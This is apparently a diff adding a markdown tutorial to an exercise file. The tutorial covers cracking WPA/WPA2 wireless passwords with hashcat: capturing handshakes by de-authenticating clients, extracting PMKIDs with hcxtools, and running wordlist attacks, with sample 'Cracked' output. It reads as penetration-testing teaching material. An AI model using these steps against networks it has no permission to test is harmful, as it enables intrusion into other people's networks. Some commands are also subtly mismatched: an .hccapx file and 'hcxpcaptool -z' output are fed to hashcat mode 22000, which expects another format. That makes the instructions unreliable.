@@ -786,3 +786,90 @@ Ejercicio
 
 
 
+
+# Cracking Wireless (WPA/WPA2) Handshakes with Hashcat
+
+Wireless security assessments are often part of penetration tests. Capturing a WPA/WPA2 handshake can provide access to a network's internal systems. Hashcat is a powerful tool to crack these handshakes, including both MIC (4-way handshake) and PMKID (1st packet/handshake).
+
+---
+
+## Cracking MIC
+
+![image](https://github.com/user-attachments/assets/6a8d1cbc-aff9-4cc2-a060-b0fda17636f6)
+
+The Message Integrity Check (MIC) ensures communication integrity between a wireless client and an Access Point (AP). Capturing the 4-way handshake allows offline cracking without transmitting the network key.
+
+### Steps:
+1. **Capture the handshake**:
+   - Use tools like `airodump-ng` to capture the handshake by sending de-authentication frames.
+2. **Convert the capture to a crackable format**:
+   ```bash
+   git clone https://github.com/hashcat/hashcat-utils.git
+   cd hashcat-utils/src
+   make
+   ./cap2hccapx.bin input.cap output.hccapx
+   ```
+3. **Run Hashcat**:
+   ```bash
+   hashcat -a 0 -m 22000 output.hccapx /path/to/wordlist.txt
+   ```
+
+Example output:
+```plaintext
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: WPA-PBKDF2-PMKID+EAPOL
+Recovered........: 4/4 (100.00%) Digests
+```
+
+---
+
+## Cracking PMKID
+
+![image](https://github.com/user-attachments/assets/6694b01c-db01-44ca-aa28-9ea0c94af55b)
+
+PMKID cracking targets WPA/WPA2-PSK networks by obtaining the Pairwise Master Key Identifier (PMKID). This attack does not require capturing the entire 4-way handshake.
+
+### Steps:
+1. **Extract the PMKID**:
+   ```bash
+   sudo apt install hcxtools
+   hcxpcaptool -z pmkidhash output.pcap
+   ```
+2. **Run Hashcat**:
+   ```bash
+   hashcat -a 0 -m 22000 pmkidhash /path/to/wordlist.txt
+   ```
+
+Example output:
+```plaintext
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: WPA-PBKDF2-PMKID+EAPOL
+Recovered........: 1/1 (100.00%) Digests
+```
+
+---
+
+## Tools
+
+- **Hashcat**: Offline password cracking tool.
+- **hcxtools**: Tools for extracting PMKID and EAPOL packets.
+
+### Installation:
+```bash
+git clone https://github.com/ZerBea/hcxtools.git
+cd hcxtools
+make && make install
+```
+
+---
+
+### Notes
+
+- Always ensure you have permission for assessments.
+- The default wordlist used in these examples is `rockyou.txt`.
+
+---
+
+By using Hashcat effectively, we can identify weak WPA/WPA2 passwords and improve wireless security.
